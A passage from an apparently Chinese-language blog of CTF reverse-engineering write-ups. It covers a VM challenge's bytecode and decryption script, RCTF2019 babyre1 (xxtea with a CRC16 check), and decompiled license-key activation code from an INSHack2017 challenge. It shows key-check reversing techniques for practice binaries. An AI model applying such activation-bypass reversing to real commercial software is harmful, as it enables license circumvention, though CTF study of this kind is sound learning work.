_155: lea_int v23[2], v23[8]
_158: ldr_int v23[10], v23[2]
_161: mov v23[0], v23[10]
_164: push v23[5], v23[0]
_167: mov v23[0], v23[4]
_170: add v23[0], v23[3]
_173: pop v23[5], v23[10]
_176: my_xor v23[10], v23[0]
_179: push v23[5], v23[10]
_182: ror v23[4], 8
_185: add v23[3], 1
_188: cmpl v23[3], 32
_191: end_loop

_192: my_xor v23[3], v23[3]
_195: my_xor v23[4], v23[4]
_198: lea_ch v23[1], v23[12]

_201: start_loop
_202: lea_ch v23[9], v23[1]
_205: add_pch v23[9], v23[3]
_208: ldr_ch v23[10], v23[9]
_211: mov v23[0], v23[10]
_214: push v23[5], v23[0]
_217: lea_int v23[8], v23[5]
_220: add_pint v23[8], 223
_223: ldr_int v23[10], v23[8]
_226: pop v23[5], v23[0]
_229: push v23[5], v23[0]
_232: cmpeq v23[0], v23[10]
_235: my_or v23[4], v23[7]
_238: add v23[3], 1
_241: cmpl v23[3], 32
_244: end_loop

_245: judge
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;因为是Mach-O文件，不会动调，只能看静态了（成功被指针恶心到了，算法全靠猜）&lt;/p&gt;
&lt;p&gt;第一个循环就是进行了一个顺序上的转换（类似栅栏吧）&lt;/p&gt;
&lt;p&gt;第二个循环看到有先右移5bit，再左移3bit，一开始猜测可能是字节内部转换，后来发现在循环的前也有个右移，循环后也有个左移，代码几乎都一样，猜测是所有字节一起进行位移&lt;/p&gt;
&lt;p&gt;第三个循环注意到有个 &lt;code&gt;ror&lt;/code&gt; 的循环右移，然后还有异或，就是每次异或一个字节&lt;/p&gt;
&lt;p&gt;最后写一个解密，从文件里dump出密文和key&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x85&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x39&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x29&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9F&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x23&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x11&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD9&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCF&lt;/span&gt;
]

key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0xDE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEF&lt;/span&gt;]

s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;):
    cipher[i] &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i
    cipher[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;
    s &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
    s &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; cipher[i]

s &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
s &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; (s &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; (len(bin(s)[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:]) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;))
s &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;=&lt;/span&gt; ((&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)

&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; libnum &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;
flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;)]
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;):
    i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
    i &lt;span style=&#34;color:#f92672&#34;&gt;%=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;
    print (chr(n2s(s)[i]), end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)

print ()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;VM题真是体力活&lt;/p&gt;
&lt;h2 id=&#34;rctf2019babyre1&#34;&gt;[RCTF2019]babyre1&lt;/h2&gt;
&lt;p&gt;这题其实出的挺好，就是flag的校验差一字节没写好，可惜了&lt;/p&gt;
&lt;p&gt;先要输入flag，并长度不能超过 &lt;code&gt;0x10&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  __printf_chk(&lt;span style=&#34;color:#ae81ff&#34;&gt;1LL&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input right flag you can got &amp;#39;Bingo!&amp;#39; :&amp;#34;&lt;/span&gt;);
  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%31s&amp;#34;&lt;/span&gt;, v11);
  v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v11[strlen(v11)];
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)(v3 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; v11) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt; )
  {
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;input is too long!&amp;#34;&lt;/span&gt;);
  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后在else里进行的第一个函数中，将16位输入（按照十六进制）压缩成了8个字节，这里还没有要求大小写&lt;/p&gt;
&lt;p&gt;中间经过的加解密函数先略过，后面的验证是需要输出一个 Bingo!，要求CRC16的校验结果为0x69E2，然后就会对运算结果再异或 &lt;code&gt;0x17&lt;/code&gt; 并输出，程序如下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v4
      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sub_180(ptr, v4, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;key_202010, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;a5), (v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v5) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;)
      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; a5 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; CRC16_3D0(v5, a5) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x69E2&lt;/span&gt; )
    {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;; a5 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)i; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
        v6[i] &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x17u&lt;/span&gt;;
      puts(v6);
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( ptr )
        free(ptr);
      free(v6);
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在知道运算结果后，看一下中间的运算，核心逻辑为&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;        xxtea_CE0((&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v8, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;(v10 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;), a3);
        v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v8[a2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
        v8[a2] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a2;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( a2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; v11 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; v11 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; )
        {
          v13 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; v11;
          &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v13;
          v8[v13] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
          &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v8;
        }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;就是一个xxtea的程序（其中包括了加密和解密，特征很明显，就不展示了），然后是根据最后一个字节进行字符串的截断&lt;/p&gt;
&lt;p&gt;爆破了一下CRC，发现前六个字节正好满足，于是不知道咋办了，查了一下发现后来出题人提供了一个md5，那就写个解密程序然后爆破就行了&lt;/p&gt;
&lt;h2 id=&#34;inshack2017proprietary-cctv-software&#34;&gt;[INSHack2017]proprietary-cctv-software&lt;/h2&gt;
&lt;p&gt;这题用uncompyle6能还原出来源码，是一个PyQt的代码，输入验证部分为&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;btn_ok_clicked&lt;/span&gt;(self):
        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; le &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;le_parts:
            s &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; le&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text()
            s &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;

        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;activator&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;activate(s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;upper()):
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ok&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;emit()
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ko&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;emit()
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;以及&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Activator&lt;/span&gt;(object):
    CHARSET &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39;&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self):
        super(Activator, self)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__init__()
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;z &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;checksum &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt;(self, b, mod):
        print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;call: block(self, b=&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;, mod=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (b, mod))
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(b) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;:
            print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;err: incorrect block length (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; len(b))
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;
        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; k &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, len(b)):
            l &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; b[k]
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; l &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; Activator&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CHARSET:
                print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;err: input not found in charset (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; l)
                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;
            v &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; abs(Activator&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CHARSET&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;index(l) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; (k &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;))
            s &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; v
            print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;current l is: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; l)
            print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;current k is: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; k)
            print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;current value is: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; v)
            print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;current sum is: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; s)

        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; s &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; mod

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;activate&lt;/span&gt;(self, s):
        print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;call: activate(self, s=&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;)&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; s)
        blocks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;)
        blocks_sz &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(blocks)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; blocks_sz &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;:
            print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;err: incorrect number of blocks (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; blocks_sz)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; k &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, blocks_sz):
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;z &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;block(blocks[k], self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;z)
            print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dbg: new z is: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;z)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;z &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;:
                print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;err: block function returned error&amp;#39;&lt;/span&gt;)
                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;z &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;checksum[k]:
